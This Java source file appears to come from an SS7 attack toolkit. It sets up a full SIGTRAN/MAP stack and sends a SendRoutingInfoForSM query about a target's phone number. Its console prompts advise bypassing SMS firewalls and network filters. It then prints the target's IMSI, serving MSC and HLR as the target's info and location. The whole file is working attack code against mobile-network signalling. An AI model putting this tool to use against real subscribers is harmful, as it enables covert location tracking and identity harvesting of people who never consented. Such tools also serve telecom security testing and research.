/**
 * Created by gh0 on 9/8/16.
 */
/**
 *
 */

import java.util.Scanner;

import org.apache.log4j.Logger;
import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.impl.parameter.ParameterFactoryImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextVersion;
import org.mobicents.protocols.ss7.map.api.MAPDialog;
import org.mobicents.protocols.ss7.map.api.MAPDialogListener;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.MAPMessage;
import org.mobicents.protocols.ss7.map.api.MAPProvider;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortProviderReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortSource;
import org.mobicents.protocols.ss7.map.api.dialog.MAPNoticeProblemDiagnostic;
import org.mobicents.protocols.ss7.map.api.dialog.MAPRefuseReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPUserAbortChoice;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.primitives.AddressString;
import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
import org.mobicents.protocols.ss7.map.api.primitives.ISDNAddressString;
import org.mobicents.protocols.ss7.map.api.primitives.MAPExtensionContainer;
import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
import org.mobicents.protocols.ss7.map.api.service.sms.AlertServiceCentreRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.AlertServiceCentreResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.ForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.InformServiceCentreRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MAPDialogSms;
import org.mobicents.protocols.ss7.map.api.service.sms.MAPServiceSmsListener;
import org.mobicents.protocols.ss7.map.api.service.sms.MoForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MoForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.MtForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MtForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.NoteSubscriberPresentRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReadyForSMRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReadyForSMResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.ReportSMDeliveryStatusRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReportSMDeliveryStatusResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMResponse;
import org.mobicents.protocols.ss7.sccp.OriginationType;
import org.mobicents.protocols.ss7.sccp.RuleType;
import org.mobicents.protocols.ss7.sccp.SccpProvider;
import org.mobicents.protocols.ss7.sccp.SccpResource;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;

abstract class SRISMLowLevel implements MAPDialogListener, MAPServiceSmsListener {

    // MTP Details
    protected int CLIENT_SPC;
    protected int SERVER_SPC; // PC of adjacent STP
    protected int NETWORK_INDICATOR; // International
    protected int SERVICE_INDICATOR = 3; // SCCP
    protected int SSN_Server = 6; // HLR SSN
    protected int SSN_Client = 8; // MSC SSN

    // M3UA details
    protected String CLIENT_IP;
    protected int CLIENT_PORT;

    protected String SERVER_IP;
    protected int SERVER_PORT;

    protected String CLIENT_ASSOCIATION_NAME = "clientAsscoiation";

    // Target Details
    String MSISDN;
    String HLR;

    // Attacker Details
    String MSC;
    String SMSC;

    protected final ParameterFactoryImpl factory = new ParameterFactoryImpl();

    protected SRISMLowLevel() {

	init();
    }

    public void init() {
	try {

	    Scanner user_input = new Scanner(System.in);

	    System.out.print("\033[34m[*]\033[0mSet Client PC: ");
	    CLIENT_SPC = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
	    SERVER_SPC = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Client IP: ");
	    CLIENT_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet Client Port: ");
	    CLIENT_PORT = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
	    SERVER_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
	    SERVER_PORT = user_input.nextInt();

	    System.out.println("***Bypass some filters, try setting it to National***");
	    System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
	    NETWORK_INDICATOR = user_input.nextInt();

	    System.out.println("***Bypass SMS Firewalls, set the Remote HLR GT if known***");
	    System.out.println("\033[34m[*]\033[0mSet Remote HLR GT: ");
	    HLR = user_input.nextLine();
	    user_input.nextLine();

	    if (HLR.isEmpty()) {
		System.out.println("***Using the MSISDN as the Destination GT***");
	    }
	    System.out.print("\033[34m[*]\033[0mSet Target's MSISDN: ");
	    MSISDN = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet your MSC GT: ");
	    MSC = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet your SMSC GT (Could be the same as your MSC): ");
	    SMSC = user_input.next();

	    System.out.println("\033[34m[*]\033[0mStack components are set...");
	    System.out.println("\033[34m[*]\033[0mInitializing the Stack...");

	} catch (Exception ex) {
	    System.out.println("\033[31m[-]\033[0mError: " + ex);
	}

    }
}

public class SendRoutingInfoforSM extends SRISMLowLevel implements MAPServiceSmsListener {

    private static Logger logger = Logger.getLogger(SendRoutingInfoforSM.class);

    // SCTP
    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl clientM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;
    private SccpResource sccpResource;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;

    public SendRoutingInfoforSM() {
	// TODO Auto-generated constructor stub
    }

    protected void initializeStack(IpChannelType ipChannelType) throws Exception {

	this.initSCTP(ipChannelType);

	// Initialize M3UA first
	this.initM3UA();

	// Initialize SCCP
	this.initSCCP();

	// Initialize TCAP
	this.initTCAP();

	// Initialize MAP
	this.initMAP();

	// FInally start ASP
	this.clientM3UAMgmt.startAsp("ASP1");
    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
	try {
	    this.sctpManagement = new ManagementImpl("Client");
	    this.sctpManagement.setSingleThread(true);
	    this.sctpManagement.start();
	    this.sctpManagement.setConnectDelay(10000);
	    this.sctpManagement.removeAllResourses();

	    // 1. Create SCTP Association
	    sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
		    ipChannelType, null);
	    System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing SCTP Stack: " + e.getMessage());
	    System.exit(1);
	}
    }

    private void initM3UA() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
	this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
	this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
	this.clientM3UAMgmt.start();
	this.clientM3UAMgmt.removeAllResourses();

	// m3ua as create rc <rc> <ras-name>
	RoutingContext rc = factory.createRoutingContext(new long[] { 100l });
	TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);

	try {
	    this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
		    trafficModeType, 1, null);

	    // Step 2 : Create ASP
	    this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);

	    // Step3 : Assign ASP to AS
	    this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");

	    // Step 4: Add Route.
	    clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");

	    System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing M3UA Stack: " + e.getMessage());
	    System.exit(2);

	}

    }

    private void initSCCP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
	try {
	    this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
	    this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);

	    this.sccpStack.start();
	    this.sccpStack.removeAllResourses();

	    this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
	    this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);

	    this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0, null);
	    // addMtp3Destination(sapID, destID, firstDPC, lastDPC, firstSls, lastSls,
	    // slaMask)
	    this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);

	    this.sccpProvider = this.sccpStack.getSccpProvider();

	    // SCCP routing table

	    // used GlobalTitleIndicator(GTI) class for createGlobalTitle is
	    // GlobalTitle0100(used for MAP)
	    GlobalTitle0100 remotGTs = this.sccpProvider.getParameterFactory().createGlobalTitle("*", 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    // Replace The String with the GT of you SMCs
	    GlobalTitle0100 localmscGT = this.sccpProvider.getParameterFactory().createGlobalTitle(MSC, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    this.sccpStack.getRouter().addRoutingAddress(1, this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server));

	    this.sccpStack.getRouter().addRoutingAddress(2, this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localmscGT, CLIENT_SPC, SSN_Client));

	    SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server);
	    SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localmscGT, CLIENT_SPC, SSN_Client);

	    String maskRemote = "K";
	    String maskLocal = "R";

	    // translate local GT to its POC+SSN (local rule)GTT
	    this.sccpStack.getRouter().addRule(1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote,
		    maskRemote, 1, -1, null, 0, null);
	    this.sccpStack.getRouter().addRule(2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal,
		    maskLocal, 2, -1, null, 0, null);

	    System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing SCCP Stack: " + e.getMessage());
	    System.exit(3);
	}
    }

    private void initTCAP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
	try {
	    this.tcapStack = new TCAPStackImpl("Test", this.sccpStack.getSccpProvider(), SSN_Client);
	    this.tcapStack.start();
	    this.tcapStack.setDialogIdleTimeout(60000);
	    this.tcapStack.setInvokeTimeout(30000);
	    this.tcapStack.setMaxDialogs(2000);
	    System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing TCAP Stack: " + e);
	}
    }

    private void initMAP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing MAAP Stack ....");

	try {
	    this.mapStack = new MAPStackImpl("MAP-SMSC", this.tcapStack.getProvider());
	    this.mapProvider = this.mapStack.getMAPProvider();

	    this.mapProvider.addMAPDialogListener(this);
	    this.mapProvider.getMAPServiceSms().addMAPServiceListener(this);

	    this.mapProvider.getMAPServiceSms().acivate();

	    this.mapStack.start();

	    System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError initializing MAP Stack: " + e);
	    System.exit(4);
	}
    }

    private void initiateSRISM() throws MAPException {

	ISDNAddressString msisdn = this.mapProvider.getMAPParameterFactory()
		.createISDNAddressString(AddressNature.international_number, NumberingPlan.ISDN, MSISDN);

	System.out.println("\033[34m[*]\033[0mLocating Target: " + MSISDN);

	// Add the E.164 address for the SMSC in the string field
	AddressString serviceCentreAddress = this.mapProvider.getMAPParameterFactory()
		.createAddressString(AddressNature.international_number, NumberingPlan.ISDN, SMSC);

	// Add the E.164 address for the SMSC in the string field
	GlobalTitle0100 gtSmsC = this.sccpProvider.getParameterFactory().createGlobalTitle(MSC, 0,
		org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		NatureOfAddress.INTERNATIONAL);
	// Add the MSISDN of the target or HLR if GT known in the string field
	GlobalTitle0100 calledPartyAddress;

	if (HLR.isEmpty()) {
	    calledPartyAddress = this.sccpProvider.getParameterFactory().createGlobalTitle(MSISDN, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);
	} else {
	    calledPartyAddress = this.sccpProvider.getParameterFactory().createGlobalTitle(HLR, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);
	}

	SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory()
		.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtSmsC, CLIENT_SPC, SSN_Client);

	SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
		RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledPartyAddress, SERVER_SPC, SSN_Server);

	// First create Dialog
	MAPDialogSms mapDialog = this.mapProvider.getMAPServiceSms().createNewDialog(MAPApplicationContext
		.getInstance(MAPApplicationContextName.shortMsgGatewayContext, MAPApplicationContextVersion.version3),
		callingParty, null, calledParty, null);

	mapDialog.addSendRoutingInfoForSMRequest(msisdn, true, serviceCentreAddress, null, false, null, null, null,
		false, null, false, false, null);

	// This will initiate the TC-BEGIN with INVOKE component
	try {
	    mapDialog.send();
	    System.out.println("\033[34m[*]\033[0mLocation Retrieval for Target " + MSISDN + " is processing..\n");
	} catch (MAPException e) {
	    System.out.println("\033[31m[-]\033[0mMAP Error: " + e.getMessage());
	    System.out.println("\033[31m[-]\033[0mTerminating Session...");
	    System.exit(5);
	}
    }

    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer extensionContainer) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("onDialogAccept for DialogId=%d MAPExtensionContainer=%s",
		    mapDialog.getLocalDialogId(), extensionContainer));
	}
    }

    public void onDialogClose(MAPDialog mapDialog) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("DialogClose for Dialog=%d", mapDialog.getLocalDialogId()));
	}

    }

    public void onDialogDelimiter(MAPDialog mapDialog) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("onDialogDelimiter for DialogId=%d", mapDialog.getLocalDialogId()));
	}
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
	System.err.printf("[-]Error: MAP DialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s\n ",
		mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
    }

    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
	    MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
	System.err.printf(
		"[-]Error: MAP DialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
	System.exit(6);
    }

    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
	    ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
	System.err.printf(
		"[-]Error: MAP DialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
	System.exit(7);
    }

    public void onDialogRelease(MAPDialog mapDialog) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("onDialogResease for DialogId=%d", mapDialog.getLocalDialogId()));
	}
    }

    public void onDialogRequest(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
	    MAPExtensionContainer extensionContainer) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format(
		    "onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s",
		    mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));
	}
    }

    @Override
    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
	    AddressString addressString2, AddressString addressString3) {

    }

    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
	    IMSI arg3, AddressString arg4) {
	if (logger.isDebugEnabled()) {
	    logger.debug(String.format("onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s ",
		    mapDialog.getLocalDialogId(), destReference, origReference));
	}
    }

    public void onDialogTimeout(MAPDialog mapDialog) {
	System.err.printf("[-]Error: MAP DialogTimeout for DialogId=%d\n", mapDialog.getLocalDialogId());
	System.exit(8);

    }

    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
	    MAPExtensionContainer extensionContainer) {
	System.err.printf(
		"[-]Error: MAP DialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), userReason, extensionContainer);
	System.exit(9);
    }

    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
	System.err.printf("[-]Error: MAP ErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage=%s\n",
		mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
	System.exit(10);
    }

    @Override
    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }

    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {
	System.err.printf("[-]Error: onInvokeTimeout for Dialog=%d and invokeId=%d\n", mapDialog.getLocalDialogId(),
		invokeId);
	System.exit(11);
    }

    @Override
    public void onForwardShortMessageRequest(ForwardShortMessageRequest forwardShortMessageRequest) {

    }

    @Override
    public void onForwardShortMessageResponse(ForwardShortMessageResponse forwardShortMessageResponse) {

    }

    @Override
    public void onMoForwardShortMessageRequest(MoForwardShortMessageRequest moForwardShortMessageRequest) {

    }

    @Override
    public void onMoForwardShortMessageResponse(MoForwardShortMessageResponse moForwardShortMessageResponse) {

    }

    @Override
    public void onMtForwardShortMessageRequest(MtForwardShortMessageRequest mtForwardShortMessageRequest) {

    }

    @Override
    public void onMtForwardShortMessageResponse(MtForwardShortMessageResponse mtForwardShortMessageResponse) {

    }

    @Override
    public void onReportSMDeliveryStatusRequest(ReportSMDeliveryStatusRequest reportSMDeliveryStatusRequest) {

    }

    @Override
    public void onReportSMDeliveryStatusResponse(ReportSMDeliveryStatusResponse reportSMDeliveryStatusResponse) {

    }

    @Override
    public void onInformServiceCentreRequest(InformServiceCentreRequest informServiceCentreRequest) {

    }

    @Override
    public void onAlertServiceCentreRequest(AlertServiceCentreRequest alertServiceCentreRequest) {

    }

    @Override
    public void onAlertServiceCentreResponse(AlertServiceCentreResponse alertServiceCentreResponse) {

    }

    @Override
    public void onReadyForSMRequest(ReadyForSMRequest readyForSMRequest) {

    }

    @Override
    public void onReadyForSMResponse(ReadyForSMResponse readyForSMResponse) {

    }

    @Override
    public void onNoteSubscriberPresentRequest(NoteSubscriberPresentRequest noteSubscriberPresentRequest) {

    }

    public void onMAPMessage(MAPMessage mapMessage) {
	// TODO Auto-generated method stub
    }

    public void onProviderErrorComponent(MAPDialog mapDialog, Long invokeId) {
	System.err.printf("[-]Error: onProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s",
		mapDialog.getLocalDialogId(), invokeId);
    }

    public void onRejectComponent(MAPDialog mapDialog, Long invokeId, Problem problem) {
	System.err.printf("[-]Error: onProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s",
		mapDialog.getLocalDialogId(), invokeId);
    }

    @Override
    public void onSendRoutingInfoForSMRequest(SendRoutingInfoForSMRequest sendRoutingInfoForSMRequest) {

    }

    public void onSendRoutingInfoForSMResponse(SendRoutingInfoForSMResponse sendRoutingInfoForSMRespInd) {
	try {
	    String imsi = sendRoutingInfoForSMRespInd.getIMSI().getData();
	    String msc = sendRoutingInfoForSMRespInd.getLocationInfoWithLMSI().getNetworkNodeNumber().getAddress();
	    String hlr = sendRoutingInfoForSMRespInd.getMAPDialog().getRemoteAddress().getGlobalTitle().getDigits();

	    System.out.println("******* Target's Info and Location *******");

	    if (imsi.isEmpty()) {
		System.out.println("\033[31m[-]\033[0mNo Info returned for the IMSI parameter");
	    } else {
		System.out.println("\033[32m[+]\033[0mIMSI of the target is:\033[31m " + imsi);
	    }
	    if (msc.isEmpty()) {
		System.out.println("\033[31m[-]\033[0mNo Info returned for the MSC address");
	    } else {
		System.out.println("\033[32m[+]\033[0mMSC of the target is:\033[31m " + msc);
	    }
	    System.out.println("\033[32m[+]\033[0mHLR of the target is:\033[31m " + hlr);

	    System.out.println(
		    "\033[34m[**]\033[0mSubscriber's Information Gathering and Network Probing is completed\033[34m[**]\033[0m");

	    System.out.println("\033[34m[*]\033[0mClosing Session...");
	    Thread.sleep(10000);
	    System.exit(0);

	} catch (Exception ex) {
	    System.out.println("\033[31m[-]\033[0mError Retrieving Information:  " + ex.getMessage());
	    System.exit(12);
	}

    }

    public static void main(String args[]) {
	System.out.println("*********************************************");
	System.out.println("***             Locating Target           ***");
	System.out.println("*********************************************");
	IpChannelType ipChannelType = IpChannelType.SCTP;

	final SendRoutingInfoforSM attacker = new SendRoutingInfoforSM();

	try {
	    attacker.initializeStack(ipChannelType);

	    // Lets pause for 20 seconds so stacks are initialized properly
	    Thread.sleep(20000);
	    attacker.initiateSRISM();

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError: " + e.getMessage());
	    System.exit(13);
	}
    }

}